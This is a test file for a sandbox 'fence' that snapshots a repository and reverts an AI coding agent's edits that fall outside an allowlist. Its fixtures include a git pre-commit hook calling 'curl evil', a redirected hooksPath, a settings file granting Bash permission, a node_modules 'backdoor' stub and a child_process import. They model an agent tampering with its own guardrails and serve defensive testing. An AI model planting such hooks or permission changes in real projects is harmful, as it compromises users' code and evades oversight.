import { existsSync, readdirSync, readFileSync, renameSync, rmSync, statSync, writeFileSync } from "node:fs"
import { join } from "node:path"
import { afterEach, describe, expect, it, vi } from "vitest"

import { cleanup, HEAD_PACKAGE_JSON, item, makeFenceFixture, MANAGED_MODULE, POST_INSTALL_LAYOUT, POST_INSTALL_PACKAGE_JSON, runGit, tempDir, write } from "../../test/wizard/repo.js"
import { reverseTextEdits } from "../server-lane/text-edits.js"
import type { CheckResult, TurnDiff } from "../wizard/contracts/jobs.js"
import { Fence, FenceTamperError } from "./fence.js"
import { snapshotDir } from "./paths.js"

const RUN_ID = "7f3c2a10-0000-4000-8000-000000000001"
// Real git in throwaway repos: give a loaded full-suite run room (review O3 F15).
vi.setConfig({ testTimeout: 30_000 })
const dirs: string[] = []
afterEach(() => cleanup(...dirs.splice(0)))

async function setup(options: { mode?: "revert" | "report" } = {}) {
  const { root } = makeFenceFixture()
  const home = tempDir("infinite-tag-home-")
  dirs.push(root, home)
  const items = [
    item("meta_improve:landing", ["app/layout.tsx", "app/page.tsx", "next.config.mjs"], ["lib/meta-mirror.ts"]),
    item("privacy_paragraph:page", ["app/privacy/page.tsx"])
  ]
  const dir = snapshotDir(home, RUN_ID, 1)
  const fence = await Fence.begin({ root, snapshotDir: dir, runId: RUN_ID, turn: 1, items, mode: options.mode })
  return { root, home, fence, dir, read: (rel: string) => readFileSync(join(root, rel), "utf8") }
}

function blockedFor(result: Awaited<ReturnType<Fence["end"]>>, itemId: string) {
  return result.blocked.filter((block) => block.itemId === itemId).map((block) => block.reason)
}

describe("fence snapshot", () => {
  it("lives outside the repo in a 0700 dir and holds the .env copy there, never in the repo", async () => {
    const { root, home, dir, fence } = await setup()
    expect(dir.startsWith(join(home, "Library/Caches/infinite-tag/snapshots/"))).toBe(true)
    expect(statSync(dir).mode & 0o777).toBe(0o700)
    const copies = readdirSync(join(dir, "files")).map((name) => join(dir, "files", name))
    const envCopy = copies.find((path) => readFileSync(path, "utf8").includes("SECRET_SITE_VALUE"))
    expect(envCopy).toBeDefined()
    expect(statSync(envCopy!).mode & 0o777).toBe(0o600)
    // The repo holds the value only in .env.local itself.
    const hits = runGit(root, ["grep", "-l", "--no-index", "SECRET_SITE_VALUE", "--", "."]).trim().split("\n")
    expect(hits).toEqual([".env.local"])
    await fence.abort()
    expect(existsSync(dir)).toBe(false)
  })

  it("refuses a snapshot dir inside the repo (negative)", async () => {
    const { root } = makeFenceFixture()
    dirs.push(root)
    await expect(Fence.begin({ root, snapshotDir: join(root, ".snap"), runId: RUN_ID, turn: 1, items: [] })).rejects.toThrow(/outside the repo/)
  })
})

describe("fence end: outside the allowlist", () => {
  it("deletes a new file outside the allowlist and blocks the job", async () => {
    const { root, fence } = await setup()
    write(root, "lib/stray.ts", "export const x = 1\n")
    const result = await fence.end()
    expect(existsSync(join(root, "lib/stray.ts"))).toBe(false)
    expect(result.reverted).toContain("lib/stray.ts")
    expect(blockedFor(result, "meta_improve:landing")).toContain("outside_allowlist")
  })

  it("keeps a new file a job may create (negative of the above)", async () => {
    const { root, fence } = await setup()
    write(root, "lib/meta-mirror.ts", "export const mirror = true\n")
    const result = await fence.end()
    expect(existsSync(join(root, "lib/meta-mirror.ts"))).toBe(true)
    expect(result.reverted).toEqual([])
    expect(result.edits.map((edit) => [edit.file, edit.beforeHash])).toEqual([["lib/meta-mirror.ts", null]])
  })

  it("restores package.json to the POST-INSTALL bytes, not HEAD's", async () => {
    const { read, root, fence } = await setup()
    write(root, "package.json", '{ "name": "hijacked" }\n')
    const result = await fence.end()
    expect(read("package.json")).toBe(POST_INSTALL_PACKAGE_JSON)
    // Negative: a HEAD revert would have lost the npm edit.
    expect(read("package.json")).not.toBe(HEAD_PACKAGE_JSON)
    expect(result.reverted).toContain("package.json")
  })

  it("restores a managed (install-written, untracked) file to its post-install bytes", async () => {
    const { read, root, fence } = await setup()
    write(root, "lib/infinite/analytics.ts", "// rewritten by the agent\n")
    const result = await fence.end()
    expect(read("lib/infinite/analytics.ts")).toBe(MANAGED_MODULE)
    expect(blockedFor(result, "meta_improve:landing")).toEqual(["outside_allowlist"])
  })

  it("restores the gitignored .env.local", async () => {
    const { read, root, fence } = await setup()
    write(root, ".env.local", "SECRET_SITE_VALUE=changed\n")
    const result = await fence.end()
    expect(read(".env.local")).toBe("SECRET_SITE_VALUE=fixture-not-a-secret\n")
    expect(result.reverted).toEqual([".env.local"])
  })

  it.each([
    [".infinite/wizard/state.json", '{ "schema": "tampered" }\n', true],
    [".git/hooks/pre-commit", "#!/bin/sh\ncurl evil\n", false],
    [".git/config", "[core]\n\thooksPath = /tmp/evil\n", true],
    [".claude/settings.local.json", '{ "permissions": { "allow": ["Bash"] } }\n', true]
  ])("restores or deletes %s and blocks the job", async (rel, text, existedBefore) => {
    const { root, fence } = await setup()
    const before = existsSync(join(root, rel)) ? readFileSync(join(root, rel), "utf8") : null
    expect(before !== null).toBe(existedBefore)
    write(root, rel, text)
    const result = await fence.end()
    if (existedBefore) expect(readFileSync(join(root, rel), "utf8")).toBe(before)
    else expect(existsSync(join(root, rel))).toBe(false)
    expect(result.reverted).toContain(rel)
    expect(result.blocked.length).toBeGreaterThan(0)
    expect(result.edits).toEqual([])
  })

  it("restores a deleted allowlisted file", async () => {
    const { read, root, fence } = await setup()
    rmSync(join(root, "app/layout.tsx"))
    const result = await fence.end()
    expect(read("app/layout.tsx")).toBe(POST_INSTALL_LAYOUT)
    expect(blockedFor(result, "meta_improve:landing")).toContain("outside_allowlist")
  })

  it("catches a rename outside the allowlist (hash/status based)", async () => {
    const { read, root, fence } = await setup()
    renameSync(join(root, "README.md"), join(root, "README2.md"))
    const result = await fence.end()
    expect(read("README.md")).toBe("# Acme\n")
    expect(existsSync(join(root, "README2.md"))).toBe(false)
    expect(result.reverted).toEqual(["README.md", "README2.md"])
  })

  it("throws FENCE_TAMPER for a new file under node_modules and restores the rest", async () => {
    const { read, root, fence } = await setup()
    write(root, "app/page.tsx", "export default function Page() { return null }\n")
    write(root, "node_modules/next/dist/server.js", "/* backdoor */\n")
    const error = await fence.end().catch((caught: unknown) => caught)
    expect(error).toBeInstanceOf(FenceTamperError)
    expect((error as FenceTamperError).code).toBe("INF_WIZ_FENCE_TAMPER")
    expect((error as FenceTamperError).message).toMatch(/Reinstall your dependencies; nothing was built/)
    expect(read("app/page.tsx")).toContain('href="/signup"')
  })

  it("does not call a clean heavy dir a tamper (negative)", async () => {
    const { root, fence } = await setup()
    write(root, "app/page.tsx", "export default function Page() {\n  return <a href=\"/signup\">Start your trial</a>\n}\n")
    const result = await fence.end()
    expect(result.edits.map((edit) => edit.file)).toEqual(["app/page.tsx"])
    expect(existsSync(join(root, "node_modules/next/package.json"))).toBe(true)
  })

  it("reverts a change that carries the literal MCP token", async () => {
    const { root, fence } = await setup()
    const token = "FAKE-TEST-TOKEN-not-a-secret-00000000000000"
    write(root, "app/page.tsx", `export const t = "${token}"\n`)
    const result = await fence.end({ secretLiterals: [token] })
    expect(readFileSync(join(root, "app/page.tsx"), "utf8")).not.toContain(token)
    expect(result.edits).toEqual([])
    expect(blockedFor(result, "meta_improve:landing")).toEqual(["outside_allowlist"])
  })
})

describe("fence end: consent hunks, text edits, the gate", () => {
  it("reverts only the consent hunk, keeps the rest, blocks consent_touched", async () => {
    const { read, root, fence } = await setup()
    const edited = POST_INSTALL_LAYOUT.replace(
      "import './globals.css'",
      "import './globals.css'\nimport { infiniteMetaMirror } from '../lib/meta-mirror'"
    ).replace("      <body>{children}</body>", "      <body>{children}</body>\n      <script>{`gtag('consent', 'update', { analytics_storage: 'granted' })`}</script>")
    write(root, "app/layout.tsx", edited)
    const result = await fence.end()
    const now = read("app/layout.tsx")
    expect(now).toContain("infiniteMetaMirror")
    expect(now).not.toContain("gtag('consent'")
    expect(blockedFor(result, "meta_improve:landing")).toEqual(["consent_touched"])
    expect(result.edits).toHaveLength(1)
    // Negative: the kept edit alone reverses to the snapshot bytes exactly.
    expect(reverseTextEdits(now, result.edits[0]!.textEdits)).toBe(POST_INSTALL_LAYOUT)
  })

  it("records exact textEdits that reverse to the snapshot bytes (several hunks, no trailing newline)", async () => {
    const { read, root, fence } = await setup()
    const edited = `// header\n${POST_INSTALL_LAYOUT.replace("<html lang=\"en\">", "<html lang=\"en\" data-x>")}// footer without newline`
    write(root, "app/layout.tsx", edited)
    write(root, "app/privacy/page.tsx", "export default function Privacy() {\n  return <p>We use PostHog and GA4.</p>\n}\n")
    const result = await fence.end()
    expect(result.edits.map((edit) => edit.file).sort()).toEqual(["app/layout.tsx", "app/privacy/page.tsx"])
    const layout = result.edits.find((edit) => edit.file === "app/layout.tsx")!
    expect(layout.textEdits.length).toBeGreaterThanOrEqual(3)
    expect(reverseTextEdits(read("app/layout.tsx"), layout.textEdits)).toBe(POST_INSTALL_LAYOUT)
    expect(layout.by).toBe("agent")
    expect(layout.runId).toBe(RUN_ID)
    expect(layout.jobId).toBe("meta_improve")
    expect(layout.beforeHash).toMatch(/^sha256:[0-9a-f]{64}$/)
    const privacy = result.edits.find((edit) => edit.file === "app/privacy/page.tsx")!
    expect(privacy.jobId).toBe("privacy_paragraph")
    // Negative: corrupt one edit and the reversal refuses.
    expect(() => reverseTextEdits(`${read("app/layout.tsx")}x`.replace("data-x", "data-y"), layout.textEdits)).toThrow()
  })

  it("runs the gate on the kept diff only and reverts the flagged hunk", async () => {
    const { read, root, fence } = await setup()
    write(root, "next.config.mjs", "import { execSync } from 'child_process'\nconst nextConfig = {}\n\nexport default nextConfig\n")
    write(root, "app/page.tsx", "export default function Page() {\n  return <a href=\"/signup\" data-conversion=\"signup\">Start free trial</a>\n}\n")
    let seen: TurnDiff | null = null
    const gate = async (diff: TurnDiff): Promise<CheckResult[]> => {
      seen = diff
      const hit = diff.files.flatMap((file) => file.added.filter((line) => line.text.includes("child_process")).map((line) => ({ file: file.path, line: line.line })))
      return hit.map((evidence) => ({ checkId: "turn_gate_exec", state: "problem" as const, reason: "child_process in a build-time file", evidence: [evidence], tier: "S" as const, at: new Date().toISOString(), runId: RUN_ID }))
    }
    const result = await fence.end({ turnGate: gate })
    expect(seen!.files.map((file) => file.path).sort()).toEqual(["app/page.tsx", "next.config.mjs"])
    expect(read("next.config.mjs")).toBe("const nextConfig = {}\n\nexport default nextConfig\n")
    expect(read("app/page.tsx")).toContain("data-conversion")
    expect(result.edits.map((edit) => edit.file)).toEqual(["app/page.tsx"])
    expect(blockedFor(result, "meta_improve:landing")).toEqual(["outside_allowlist"])
    expect(result.gate).toHaveLength(1)
  })

  it("passes a clean turn through with no blocks (negative)", async () => {
    const { fence } = await setup()
    const result = await fence.end({ turnGate: async () => [] })
    expect(result).toEqual({ reverted: [], blocked: [], edits: [], gate: [], reportedOutside: [], seal: expect.objectContaining({ root: expect.any(String) }) })
  })
})

describe("fence abort, load and report mode", () => {
  it("abort restores every change from the snapshot", async () => {
    const { read, root, fence } = await setup()
    write(root, "app/layout.tsx", "broken\n")
    write(root, "lib/new.ts", "x\n")
    write(root, ".env.local", "changed\n")
    const out = await fence.abort()
    expect(read("app/layout.tsx")).toBe(POST_INSTALL_LAYOUT)
    expect(existsSync(join(root, "lib/new.ts"))).toBe(false)
    expect(read(".env.local")).toBe("SECRET_SITE_VALUE=fixture-not-a-secret\n")
    expect(out.restored.sort()).toEqual([".env.local", "app/layout.tsx", "lib/new.ts"])
  })

  it("a crashed turn restores later from the manifest (Fence.load)", async () => {
    const { read, root, dir } = await setup()
    write(root, "app/page.tsx", "half-written")
    const reopened = await Fence.load(dir)
    await reopened.abort()
    expect(read("app/page.tsx")).toContain('href="/signup"')
    await expect(reopened.end()).rejects.toThrow(/already settled/)
  })

  it("report mode (nested, B8) reverts outside edits BEFORE any check, keeps the parent's bytes aside, and blocks no job for them; consent hunks still block", async () => {
    const { read, root, fence, dir } = await setup({ mode: "report" })
    write(root, "lib/stray.ts", "export const x = 1\n")
    write(root, "app/page.tsx", "export default function Page() {\n  gtag('consent', 'update', {})\n  return null\n}\n")
    const result = await fence.end()
    // reverted (the file was new, so it is gone), the parent agent's bytes kept under <snapshot>/rejected
    expect(existsSync(join(root, "lib/stray.ts"))).toBe(false)
    expect(result.rejectedDir).toBe(join(dir, "rejected"))
    expect(readFileSync(join(dir, "rejected", "lib/stray.ts"), "utf8")).toBe("export const x = 1\n")
    expect(result.reportedOutside).toEqual(["app/page.tsx", "lib/stray.ts"])
    expect(read("app/page.tsx")).not.toContain("gtag('consent'")
    expect(readFileSync(join(dir, "rejected", "app/page.tsx"), "utf8")).toContain("gtag('consent'")
    // the outside edit blocks no job (no job owns it); the consent hunk blocks its own
    expect(blockedFor(result, "meta_improve:landing")).toEqual(["consent_touched"])
    expect(blockedFor(result, "privacy_paragraph:page")).toEqual([])
    // only the rejected bytes survive the settle (the snapshot copies are deleted)
    expect(readdirSync(dir)).toEqual(["rejected"])
  })

  it("report mode never resets refs or the index: a parent agent's own commit on the line is kept; HEAD off the line → BRANCH_FAILED", async () => {
    const kept = await setup({ mode: "report" })
    write(kept.root, "notes.txt", "mine\n")
    runGit(kept.root, ["add", "notes.txt"])
    runGit(kept.root, ["-c", "user.email=t@example.com", "-c", "user.name=T", "commit", "-q", "-m", "parent agent commit"])
    const head = runGit(kept.root, ["rev-parse", "HEAD"]).trim()
    await kept.fence.end()
    expect(runGit(kept.root, ["rev-parse", "HEAD"]).trim()).toBe(head)

    // negative: HEAD moved to a commit that does not descend from the hand-off
    const moved = await setup({ mode: "report" })
    runGit(moved.root, ["checkout", "-q", "--orphan", "elsewhere"])
    runGit(moved.root, ["-c", "user.email=t@example.com", "-c", "user.name=T", "commit", "-q", "--allow-empty", "-m", "unrelated"])
    await expect(moved.fence.end()).rejects.toMatchObject({ code: "INF_WIZ_BRANCH_FAILED" })
  })

  it("writes manifest and copies 0600", async () => {
    const { dir, fence } = await setup()
    expect(statSync(join(dir, "manifest.json")).mode & 0o777).toBe(0o600)
    writeFileSync(join(dir, "probe"), "x")
    await fence.abort()
  })
})
